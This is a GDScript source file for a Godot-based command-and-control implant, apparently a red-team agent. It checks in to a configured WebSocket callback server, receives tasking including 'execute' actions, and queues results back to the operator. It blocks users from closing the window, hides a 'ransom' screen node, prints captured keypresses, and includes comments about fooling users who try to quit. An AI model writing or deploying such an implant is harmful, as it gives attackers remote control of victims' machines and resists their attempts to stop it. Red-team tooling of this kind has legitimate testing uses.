extends Node

var time = 0
var time_period = 1
var do_exit = false
var exiting = false
var outbound = []
var _client
var headers
var connect_attempt

const MAX_CONNECT_ATTEMPT = 3

signal checkin
signal tasking
signal post_response

func _unhandled_input(event):
	if event is InputEventKey:
		if event.pressed:
			print(event.scancode)

func _notification(what):
	if what == MainLoop.NOTIFICATION_WM_QUIT_REQUEST:
		pass
		# Send notification to redteam that the user is trying to close the agent?
		# Send window to background so they think they were successful, set timer, pop-up again in a little bit?


func _ready():
	connect_attempt = MAX_CONNECT_ATTEMPT

	get_tree().set_auto_accept_quit(false) # Don't let users click X or alt+F4
	get_tree().get_root().set_transparent_background(true) # transparent background?

	$ransom.hide()
	
	_client = WebSocketClient.new()

	_client.connect("connection_closed", self, "_closed")
	_client.connect("connection_error", self, "_error")
	_client.connect("connection_established", self, "_connected")
	_client.connect("data_received", self, "_on_data")
	_client.connect("server_close_request", self, "_on_server_close")

	$CallbackTimer.wait_time = $config.get_callback_wait_time()
	
	print("$CallbackTimer.wait_time: ", $CallbackTimer.wait_time)

	_client.set_buffers(1024, 1024, 1024, 1024)
	_client.set_verify_ssl_enabled($config.get_verify())

func _on_server_close (code, reason):
	print("_on_server_close ", code, " " , reason)
	exiting = true

func _error():
	print("websocket error...")
	connect_attempt -= 1

func _closed(was_clean = false):
	print("Closed, clean: ", was_clean)
	exiting = true

func _connected(_proto = ""):
	print("Connected!")
	connect_attempt = MAX_CONNECT_ATTEMPT

	$CallbackTimer.start()

	var ret = _client.get_peer(1).put_packet($api.wrap_payload($api.get_checkin_payload()))

	if ret != OK:
		print("failed to send checkin")
	else:
		print("checkin sent") # After N tasking requests w/o responses - kill ourself 

func _on_data():
	var packet = _client.get_peer(1).get_packet().get_string_from_utf8()
	
	if not packet.length():
		return

	var result = $api.unwrap_payload(packet)

	if not result.has("action") or result["action"] == "":
		print("Bad message unpacked? ", result)
		return

	match result.get("action"):
		"checkin":
			emit_signal("checkin", result)
		"execute":
			emit_signal("execute", result)
		"get_tasking":
			emit_signal("tasking", result)
		"post_response":
			emit_signal("post_response", result)
		_:
			print("unknown... %s" % result)

func _process(delta):
	time += delta

	if time > time_period:
		var status = _client.get_connection_status()

		if status == NetworkedMultiplayerPeer.CONNECTION_DISCONNECTED:

			if connect_attempt <= 0:
				close_and_quit()
			else:
				# TODO: timer for attempts or bursty, go, go, go! ?
				var err = _client.connect_to_url($config.get_callback_uri(), [], false, $config.get_headers())

				if err != OK:
					print("Unable to connect")
					connect_attempt -= 1
				else:
					print("connected?")
		else:
			_client.poll()

			if $api.checkin_done and not exiting:
				print("outbound size: %s in %s seconds" % [String(outbound.size()), String($CallbackTimer.wait_time)])

				time = 0

				if ($CallbackTimer.do_callback and outbound.size() > 0) or do_exit:
					$CallbackTimer.do_callback = false

					# TODO: flush outbound, slow emit, or only one at a time?
					while outbound.size() > 0:
						var msg = outbound.pop_front()
						print("outbound size: %s in" % String(outbound.size()))

						var ret = _client.get_peer(1).put_packet(msg)

						if ret != OK:
							print("failed to send data...", msg)
						else:
							print("\ndata sent\n")

			if do_exit and outbound.size() <= 0:

				_client.disconnect_from_host()

				if exiting:
					close_and_quit()

func close_and_quit():
	set_process(false)

	yield(get_tree().create_timer(1.0), "timeout")

	get_tree().quit()

func _on_api_agent_response(payload):

	if payload:
		outbound.append(payload)

func _on_tasking_exit(task):
	do_exit = true

	$api.agent_response(
		$api.create_task_response(
			true,
			true,
			task.get("id"),
			"Any last words?",
			[
				[
					"Process Destroy",
					"zippy agent"
				]
			]
		)
	)
